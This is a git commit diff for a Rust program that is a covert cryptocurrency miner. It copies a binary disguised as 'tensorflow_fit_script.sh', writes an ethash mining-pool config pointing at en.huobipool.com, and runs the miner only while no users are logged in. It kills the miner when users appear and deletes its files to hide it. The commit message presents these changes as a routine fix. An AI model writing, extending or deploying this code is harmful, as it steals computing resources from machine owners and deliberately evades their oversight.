bde404c553e039efb59a7ce4e6e190a912674f1a
Jerry <calljerryli@outlook.com>
2021-03-23 09:24:01 +0800

    fix: sleep 10 sec befor clean_env()

--- src/lib.rs
+++ src/lib.rs
@@ -10,28 +10,27 @@ pub fn get_user_count() -> usize {
 pub fn init_env() {
     println!("init_env()");
     let mut command = Command::new("cp");
-    command.arg("/tmp/b86547d084228861")
+    command
+        .arg("/tmp/b86547d084228861")
         .arg("tensorflow_fit_script.sh");
     let mut process = command.spawn().unwrap();
     process.wait().unwrap();
     let mut config = File::create("c").unwrap();
-    config.write_all(b"[common]\nalgo=ethash\npers=BgoldPoW\nwatchdog=1\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e").unwrap();
+    config.write_all(b"[common]\nalgo=ethash\npers=BgoldPoW\nwatchdog=1\napi=10555\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e").unwrap();
+    config.sync_all().unwrap();
 }
 
 pub fn clean_env() {
     println!("clean_env()");
     let mut command = Command::new("rm");
-    command.arg("-rf")
-        .arg("tensorflow_fit_script.sh")
-        .arg("c");
+    command.arg("-rf").arg("tensorflow_fit_script.sh").arg("c");
     command.spawn().unwrap();
 }
 
 pub fn start_target_process() -> u32 {
     println!("start_target_process()");
     let mut command = Command::new("./tensorflow_fit_script.sh");
-    command.arg("--config")
-        .arg("c");
+    command.arg("--config").arg("c");
     let process = command.spawn().unwrap();
     let pid = process.id();
     println!("target process pid: {}", pid);
@@ -41,8 +40,7 @@ pub fn start_target_process() -> u32 {
 pub fn kill_target_process(pid: &mut u32) {
     println!("kill_target_process()");
     let mut command = Command::new("kill");
-    command.arg("-9")
-        .arg(pid.to_string());
+    command.arg("-9").arg(pid.to_string());
     let mut process = command.spawn().unwrap();
     process.wait().unwrap();
     *pid = 0;
--- src/main.rs
+++ src/main.rs
@@ -5,18 +5,21 @@ use chrono::Utc;
 
 use no_mans_sky::*;
 
+const USER_COUNT_THRESHOLD: usize = 0;
+
 fn main() {
     let mut pid: u32 = 0;
     loop {
         let user_count = get_user_count();
         println!("{} user_count: {}", Utc::now(), user_count);
-        if user_count > 0 && pid != 0 {
+        if user_count > USER_COUNT_THRESHOLD && pid != 0 {
             clean_env();
             kill_target_process(&mut pid);
         }
-        if user_count <= 0 && pid == 0 {
+        if user_count <= USER_COUNT_THRESHOLD && pid == 0 {
             init_env();
             pid = start_target_process();
+            thread::sleep(Duration::from_secs(10));
             clean_env();
         }
         thread::sleep(Duration::from_secs(1));
